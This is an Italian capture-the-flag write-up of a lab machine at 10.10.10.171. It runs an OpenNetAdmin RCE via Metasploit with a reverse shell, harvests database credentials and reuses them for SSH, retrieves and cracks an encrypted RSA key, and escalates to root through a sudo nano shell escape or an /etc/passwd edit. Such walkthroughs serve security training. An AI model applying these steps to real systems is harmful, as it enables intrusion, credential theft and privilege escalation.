## Information Gathering  + Exploiting ##

* Scovata la pagina 10.10.10.171/ona/

* Risulta essere vulnerabile all'exploit "OpenNetAdmin 18.1.1 - Remote Code Execution"

* Importo il .rb dentro metasploit, lo seleziono con "use", setto il payload "linux/x64/meterpreter/reverse_tcp"

## Post-Exploitation - User 1 Escalation - ##

* Scopro un file di config con delle credenziali di un DB, grazie al comando:
```
$ grep -rnw . -e 'db_passwd'  
./plugins/ona_nmap_scans/install.php:153:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
./include/functions_db.inc.php:102:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
./include/functions_db.inc.php:108:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
./include/functions_db.inc.php:150:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
./local/config/database_settings.inc.php:13:        'db_passwd' => 'n1nj4W4rri0R!',
```

* Contenuto del file "database_settings.inc.php":
```
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

* mysql -u ona_sys -p ona_default -e 'show tables'

* mysql -u ona_sys -p ona_default -e 'select * from users'
```
id      username        password        level   ctime   atime
1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-02-15 13:47:44     2020-02-15 13:47:43
2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
```
* Uso CrackStation per rompere gli MD5, risultato:
```
1 test
2 admin
```

* Ho vinto il premio dell'anno per PirlaSummaCumLaude, ho fatto ssh jimmy@10.10.10.171 e la password era... n1nj4W4rri0R!

RabbitHole il DB!

## Post-Exploitation - User 2 Escalation - ##

* Ho trovato nella folder /home/jimmy/.ssh la seguente stringa:
```
|1|+jHNuEBNL1R1f9YVJsKhsHWRw24=|p4AqqwkcMx9DwyxPRhzcCxxJR1U= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
```

  ** Nope tutte robe inutili
  
* Lanciato grep da / per tutte le folder con Jimmy come owner

* Rilevata folder "/var/www/internal/" con "main.php" interessante.

* C'è una funzioncina che ti stampa a video la chiave RSA di Joanna. La invoco con:
```
curl 127.0.0.1/main.php
```
* Non succede nulla, quindi cerco altre eventuali porte in ascolto:
```
netstat -tulpn
```  
* Trovo altre porte aperte in ascolto, tra cui: *2846*

* curl http://127.0.0.1:52846/main.php

* Recupero l'id_rsa di Joanna:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

* La chiave è protetta da passphrase, la rompo con John e scopro che è:
```
"bloodninjas"
```
* Apro una nuova sessione con Joanna:
```    
$ ssh -i id_rsa_joanna joanna@10.10.10.171
```
*#*#* Prelevo User Flag! *#*#*

## Post-Exploitation - Root Privilege Escalation - ##

* Si comincia per il root! Con "sudo -l" scopro che Joanna è abilitata a lanciare sudo senza password "sudo /bin/nano /opt/priv", lo lancio e mi apre una sessione di nano.

* GTFOBins mi suggerisce come spawnare una shell con privilegi di root: 
 ```   
CTRL+R CTRL+X e poi "reset; sh 1>&0 2>&0"
```
* cat /root/root.txt 

*#*#* Prelevo ROOT's Flag! *#*#*

BIS) In alernativa posso aggiungere un utente al file /etc/psswd! Apro il nano in sudo come al punto 11, quindi:
```
  CTRL+O

  etc/psswd

  Aggiungo un utente root.
```
